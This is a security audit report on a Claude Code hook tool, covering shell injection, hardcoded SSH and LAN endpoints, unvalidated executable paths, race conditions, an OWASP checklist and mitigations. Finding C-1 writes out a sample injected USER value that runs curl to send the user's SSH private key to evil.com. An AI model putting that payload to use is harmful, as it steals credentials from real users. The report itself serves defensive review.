# Security Analysis

**Risk Level: HIGH**

## Executive Summary

This tool runs as a Claude Code hook on **every user prompt** and at **session end**, executing automatically with user privileges. The attack surface is larger than typical developer tools. The codebase contains **2 Critical**, **4 High**, **5 Medium**, and **3 Low** severity findings. The most severe issues involve hardcoded third-party infrastructure, unvalidated executable paths, and unauthenticated network operations.

## Vulnerability Assessment

### Critical Issues

#### C-1: SSH to Hardcoded Third-Party IP with Shell-Injectable `USER`
- **Location:** `scripts/i_flag_hook.py:478, 482, 492, 681`
- **Risk:** The code constructs SSH commands to `10.211.55.4` (a Parallels VM address belonging to the original author). `USER` env var is interpolated without sanitization, enabling shell injection via `tmux run-shell`.
- **Exploitation:** `USER="attacker'; curl evil.com -d @~/.ssh/id_rsa; echo '"` achieves arbitrary shell execution on the next `-ic` invocation.
- **Mitigation:** Remove the entire SSH sync block. If needed, make it user-configurable with input validation.

#### C-2: Unvalidated Executable Path from `.python_cmd`
- **Location:** `scripts/i_flag_hook.py:189-200`, `scripts/stop_hook.py:44-65`
- **Risk:** `~/.claude-code-project-index/.python_cmd` is read and used as an executable without path validation. An attacker who can write to this file controls what binary runs on every prompt.
- **Mitigation:** Validate path is absolute, matches `^/[a-zA-Z0-9/_.-]+$`, resolves to executable. Set file permissions to `600`.

### High-Risk Issues

#### H-1: Unauthenticated LAN Probing with Data Exfiltration
- **Location:** `scripts/i_flag_hook.py:283-292`
- **Risk:** Probes 3 hardcoded LAN IPs (`10.211.55.2`, `10.211.55.1`, `192.168.1.1`) on every `-ic` invocation. Any device answering the daemon port receives the full codebase index and user prompt.
- **Mitigation:** Remove hardcoded IPs. Require explicit user opt-in for VM Bridge.

#### H-2: `os.chdir()` Globally Mutates CWD
- **Location:** `scripts/stop_hook.py:63`
- **Risk:** Permanently changes process working directory. `subprocess.run` already accepts `cwd=` parameter, making `os.chdir` redundant and unsafe.
- **Mitigation:** Replace with `cwd=str(project_root)` in subprocess call. One-line fix.

#### H-3: `sys.path.insert(0)` with Unvalidated Third-Party Paths
- **Location:** `scripts/i_flag_hook.py:278, 304`
- **Risk:** Inserts `/home/ericbuess/Projects/vm-bridge` and other author-specific paths at highest Python import priority. Any attacker who can create files at these paths achieves code execution.
- **Mitigation:** Remove all hardcoded third-party paths. Require user-configured plugin path.

#### H-4: Non-Atomic File Writes (Race Condition)
- **Location:** `scripts/i_flag_hook.py:212-241`, `scripts/project_index.py:741`
- **Risk:** Both files write `PROJECT_INDEX.json` without locking or atomic rename. Concurrent sessions can corrupt the file.
- **Mitigation:** Use `tempfile` + `os.replace()` (POSIX atomic) and `fcntl.flock` for read-modify-write.

### Medium-Risk Issues

#### M-1: Sensitive Data Written to World-Readable CWD File
- **Location:** `scripts/i_flag_hook.py:388, 403, 557`
- **Risk:** `.clipboard_content.txt` with full index + prompt written to project directory with default umask (`0o644`).
- **Mitigation:** Write to `tempfile.mkstemp()` with `0o600` permissions.

#### M-2: Bare `except:` Suppresses KeyboardInterrupt/SystemExit
- **Location:** 12 occurrences across all files
- **Risk:** Users cannot Ctrl+C hung operations; errors hidden from debugging.
- **Mitigation:** Replace with `except Exception:`.

#### M-3: Silent Xvfb Process Spawning
- **Location:** `scripts/i_flag_hook.py:522-529`
- **Risk:** Spawns persistent Xvfb on display `:99` without user knowledge. Never cleaned up.
- **Mitigation:** Remove automatic Xvfb launch; fall through to file fallback.

#### M-4: TTY Device Path from tmux Not Validated
- **Location:** `scripts/i_flag_hook.py:430-449`
- **Risk:** Opens and writes to arbitrary path obtained from tmux output.
- **Mitigation:** Validate against `^/dev/(pts/\d+|tty\d*)$`.

#### M-5: `INDEX_TARGET_SIZE_K` Unbounded
- **Location:** `scripts/project_index.py:713-719`
- **Risk:** No bounds validation or `ValueError` guard on `int()` parse.
- **Mitigation:** Wrap in try/except, clamp to defined maximum.

### Low-Risk Issues

#### L-1: `rm -rf` Without Path Guard (`install.sh:90`)
#### L-2: `.python_cmd` Written World-Readable (`install.sh:158`)
#### L-3: No Integrity Verification of Cloned Repository (`install.sh:133`)

## OWASP Top 10 Check

| Category | Status | Finding |
|----------|--------|---------|
| A01: Broken Access Control | N/A | Local tool, no multi-user access model |
| A02: Cryptographic Failures | PASS | No crypto used (SHA-256 for cache hash is appropriate) |
| A03: Injection | **FAIL** | Shell injection via `USER` in SSH command (C-1) |
| A04: Insecure Design | **FAIL** | Hardcoded third-party infrastructure (C-1, H-1, H-3) |
| A05: Security Misconfiguration | **FAIL** | World-readable files, unvalidated paths (C-2, M-1) |
| A06: Vulnerable Components | PASS | Zero external dependencies |
| A07: Auth Failures | N/A | No authentication required |
| A08: Data Integrity | **FAIL** | Non-atomic writes, no file locking (H-4) |
| A09: Logging Failures | PASS | stderr logging present |
| A10: SSRF | **FAIL** | Outbound connections to hardcoded IPs (H-1) |

## Security Strengths

- Consistent avoidance of `shell=True` in primary subprocess calls
- Zero external pip dependencies (no supply chain risk)
- Comprehensive timeout limits on all subprocess calls
- Hook exits cleanly on error (never blocks Claude)

## Immediate Actions Required

1. **Remove all hardcoded IPs and SSH commands** (C-1, H-1) — only finding affecting external hosts
2. **Validate `.python_cmd`** with path checks + `chmod 600` (C-2)
3. **Remove author-specific `sys.path` insertions** (H-3)
4. **Replace `os.chdir()`** with `cwd=` parameter (H-2) — one-line fix
5. **Replace all bare `except:`** with `except Exception:` (M-2)

## Root Cause

Findings C-1, H-1, and H-3 share a common origin: this codebase was a personal tool developed for the original author's specific Parallels VM setup and was published without removing environment-specific code. The tool is safe in the author's exact environment; it is unsafe for general distribution.
